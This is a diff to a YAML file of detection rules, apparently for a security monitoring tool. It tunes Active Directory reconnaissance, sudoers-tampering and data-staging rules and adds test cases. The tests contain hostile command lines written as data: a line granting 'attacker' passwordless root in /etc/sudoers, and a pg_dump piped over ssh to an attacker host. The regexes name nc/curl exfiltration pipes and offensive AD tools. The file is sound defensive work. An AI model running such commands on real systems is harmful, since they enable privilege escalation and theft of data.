@@ -97,25 +97,41 @@ rules:
 
 - id: TB-DISC-001
   name: Active Directory / domain reconnaissance command
-  severity: medium
-  confidence: 70
+  severity: low
+  signal: true
+  confidence: 60
   techniques: [T1087.002, T1069, T1482]
   tags: [discovery, active-directory]
   tuning: Domain admins legitimately run these; scope to non-admin accounts if noisy.
   match:
     any:
       - {field: command_line, regex: 'net1?(\.exe)?\s+(group|accounts)\s.{0,40}/domain'}
-      - {field: command_line, regex: 'net1?(\.exe)?\s+user(\s+[\w.$-]{1,30})?\s+/domain\s*$'}
+      - {field: command_line, regex: 'net1?(\.exe)?\s+user\s+/domain\s*$'}
       - {field: command_line, regex: 'nltest(\.exe)?\s.{0,40}/(dclist|domain_trusts|trusted_domains)'}
-      - {field: command_line, regex: '\b(dsquery|adfind)(\.exe)?\s+(\*|user|computer|group|-f)'}
       - {field: command_line, regex: 'get-ad(user|computer|group|domain|trust)\b'}
-      - {field: command_line, regex: '\b(sharphound|bloodhound)\b'}
   tests:
     - {event: {command_line: 'net group "Domain Admins" /domain'}, expect_match: true}
     - {event: {command_line: 'nltest /dclist:corp.example.com'}, expect_match: true}
     - {event: {command_line: 'net use Z: \\fileserver\share'}, expect_match: false}
     - {name: password reset is not enumeration, event: {command_line: 'net user jsmith NewTemp#2026 /domain'}, expect_match: false}
-    - {name: user query, event: {command_line: 'net user alice /domain'}, expect_match: true}
+    - {name: a single-user lookup is ordinary help-desk work, event: {command_line: 'net user alice /domain'}, expect_match: false}
+    - {name: listing every domain user, event: {command_line: 'net user /domain'}, expect_match: true}
+
+- id: TB-DISC-005
+  name: Offensive Active Directory enumeration tooling
+  severity: high
+  confidence: 80
+  techniques: [T1087.002, T1069.002, T1482]
+  tags: [discovery, active-directory, tooling]
+  tuning: AdFind is also an administrators' tool; scope to accounts that never run it.
+  match:
+    any:
+      - {field: command_line, regex: '\b(sharphound|bloodhound(-python)?|adfind|adexplorer|pingcastle|ldapdomaindump|powerview|invoke-bloodhound|get-domainuser|get-netuser|get-domaincomputer)(\.exe|\.ps1)?\b'}
+      - {field: command_line, regex: '\bdsquery(\.exe)?\s+\*\s'}
+  tests:
+    - {event: {command_line: 'SharpHound.exe -c All'}, expect_match: true}
+    - {event: {command_line: 'adfind.exe -f "(objectcategory=person)" -csv'}, expect_match: true}
+    - {event: {command_line: 'net user alice /domain'}, expect_match: false}
 
 - id: TB-DISC-002
   name: Kerberoasting reconnaissance or ticket request
@@ -141,6 +157,7 @@ rules:
 
 - id: TB-DISC-004
   name: Network share or SMB host enumeration
+  signal: true
   severity: low
   confidence: 50
   techniques: [T1135]
@@ -158,7 +175,8 @@ rules:
 
 - id: TB-DISC-003
   name: Cloud / container resource enumeration of secrets or credentials
-  severity: medium
+  signal: true
+  severity: low
   confidence: 65
   techniques: [T1613, T1526, T1552]
   tags: [discovery, cloud, kubernetes]
@@ -1016,7 +1034,7 @@ rules:
   tuning: Configuration management writes /etc/sudoers.d/ files; exclude by process_name or parent_process.
   match:
     any:
-      - {field: command_line, regex: '(echo|printf|tee|cat)\b.{0,160}(nopasswd\s{0,3}:\s{0,3}all\b|\ball\s{0,3}=\s{0,3}\(\s{0,3}all(\s{0,3}:\s{0,3}all)?\s{0,3}\)\s{0,3}all\b).{0,60}(/etc/sudoers|/etc/doas\.conf)'}
+      - {field: command_line, regex: '(echo|printf|tee|cat)\b.{0,160}(nopasswd\s{0,3}:\s{0,3}all\b|\ball\s{0,3}=\s{0,3}\(\s{0,3}all(\s{0,3}:\s{0,3}all)?\s{0,3}\)\s{0,3}all\b).{0,60}(/etc/sudoers(?![./\w])|/etc/doas\.conf)'}
       - {field: command_line, regex: '(sed|perl)\s.{0,80}(nopasswd|%sudo|%wheel).{0,80}/etc/sudoers'}
       - {field: command_line, regex: 'usermod\s.{0,20}-a?G\s{0,3}(sudo|wheel|admin|root)\b'}
       - {field: command_line, regex: '(sed\s+-i\S{0,6}|tee\s+(-a\s+)?|>>?\s{0,3}).{0,160}/etc/sudoers(?![./\w])|sh\s+-c\s+.{0,120}(>>?\s{0,3})/etc/sudoers(?![./\w])'}
@@ -1024,6 +1042,7 @@ rules:
     - {event: {command_line: 'echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'}, expect_match: true}
     - {event: {command_line: 'echo "deploy ALL=(ALL) NOPASSWD:/usr/bin/systemctl" | tee /etc/sudoers.d/deploy'}, expect_match: false}
     - {event: {command_line: 'visudo -cf /etc/sudoers.d/deploy'}, expect_match: false}
+    - {name: drop-in file for one user, event: {command_line: 'echo "alice ALL=(ALL) ALL" | sudo tee /etc/sudoers.d/alice'}, expect_match: false}
     - {name: weakening sudo timeouts in place, event: {command_line: "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers"}, expect_match: true}
     - {name: reading sudoers, event: {command_line: 'sudo cat /etc/sudoers'}, expect_match: false}
     - {event: {command_line: 'usermod -aG sudo bob'}, expect_match: true}
@@ -1740,7 +1759,8 @@ rules:
   tags: [staging, collection]
   match:
     any:
-      - {field: command_line, regex: '(7z|7za|rar|zip|tar|gzip|pigz)(\.exe)?\s.{0,60}(\ba\b|-?[a-z]*c[a-z]*f|-r|-p\S{0,20}).{0,120}(\\users\\|/home\b|/etc\b|/var/www|/root\b|\.sql|\.db|\.pst|\.kdbx|documents|desktop)'}
+      - {field: command_line, regex: '(7z|7za|rar|zip|tar|gzip|pigz)(\.exe)?\s.{0,60}(\ba\b|-?[a-z]*c[a-z]*f|-r|-p\S{0,20}).{0,120}(\\users\\|/home\b|\.sql|\.db|\.pst|\.kdbx|documents|desktop)'}
+      - {field: command_line, regex: '(7z|7za|rar|zip|tar|gzip|pigz)(\.exe)?\s.{0,60}(\ba\b|-?[a-z]*c[a-z]*f|-r|-p\S{0,20})\s{1,3}"?(/tmp/|/dev/shm/|/var/tmp/|\.\./)\S{0,80}.{0,80}(/etc\b|/var/www|/root\b)'}
       - {field: command_line, regex: '(compress-archive|\bmakecab\b|\brar\s+a\b).{0,120}(\\users\\|documents|desktop|\.pst|\.kdbx)'}
       - {field: command_line, regex: '(mysqldump|pg_dump|pg_dumpall|mongodump|bcp\s.{0,60}\sout\s|redis-cli\s.{0,20}--rdb).{0,200}(>|>>|-f|--file|--out|-o)\s{0,3}"?(/tmp/|/dev/shm/|/var/tmp/|\.{1,2}/|\\\\users\\\\public|\\\\windows\\\\temp|c:\\\\temp)'}
       - {field: command_line, regex: '(mysqldump|pg_dump|pg_dumpall|mongodump).{0,200}\|\s{0,3}(curl|nc|ncat|ssh|scp|openssl|gzip.{0,30}\|\s{0,3}(nc|ncat|ssh|curl))'}
@@ -1750,6 +1770,8 @@ rules:
     - {event: {command_line: 'tar xzf release.tgz'}, expect_match: false}
     - {event: {command_line: 'pg_dump appdb | ssh attacker@203.0.113.9 "cat > /srv/appdb.sql"'}, expect_match: true}
     - {event: {command_line: 'mysqldump --single-transaction appdb > /var/backups/appdb.sql'}, expect_match: false}
+    - {name: routine /etc backup into the backup directory, event: {command_line: 'tar czf /var/backups/etc-2026-04-02.tgz /etc'}, expect_match: false}
+    - {name: /etc archived into /tmp, event: {command_line: 'tar czf /tmp/e.tgz /etc /var/www'}, expect_match: true}
 
 - id: TB-EXFIL-003
   name: Data uploaded to an external service with a sync / transfer utility
